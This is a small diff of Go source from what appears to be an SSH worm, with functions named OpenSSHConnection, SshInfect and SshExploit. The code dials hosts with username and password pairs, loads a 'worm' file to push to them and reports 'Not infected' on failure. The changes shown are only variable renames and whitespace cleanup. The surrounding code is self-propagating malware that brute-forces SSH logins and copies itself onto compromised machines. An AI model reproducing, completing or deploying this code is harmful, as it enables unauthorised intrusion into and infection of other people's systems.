@@ -108,13 +108,13 @@ func OpenSSHConnection(ip string) (*ssh.Client, *ssh.Session) {
 	miss = false
 
 	//log.Println("Connecting with pair:", "username:", username, "password:", password, "on ip:", ip)
-	client, err := ssh.Dial("tcp",ip,config)
+	c, err = ssh.Dial("tcp",ip,config)
 	if err != nil {
 		//log.Println("Failed to dial: ", err)
 		miss = true
 	}
 	if !miss {
-	  s, err = client.NewSession()
+	  s, err = c.NewSession()
 	  if err != nil {
 	  	//log.Println("Failed to create session: ", err)
 	  }
@@ -156,8 +156,8 @@ func SshInfect(ip string, filename string) string {
 	}
 
 	if session == nil || client == nil {
-		return "Not infected" 
-	} 
+		return "Not infected"
+	}
 
 	var worm []byte
 	worm = GetFile(worm_dir + "/" + filename)
@@ -178,7 +178,7 @@ func SshExploit(ip string) string {
 	}
 
 	if session == nil || client == nil {
-		return "Not infected" 
+		return "Not infected"
 	}
 
 	session.CombinedOutput(
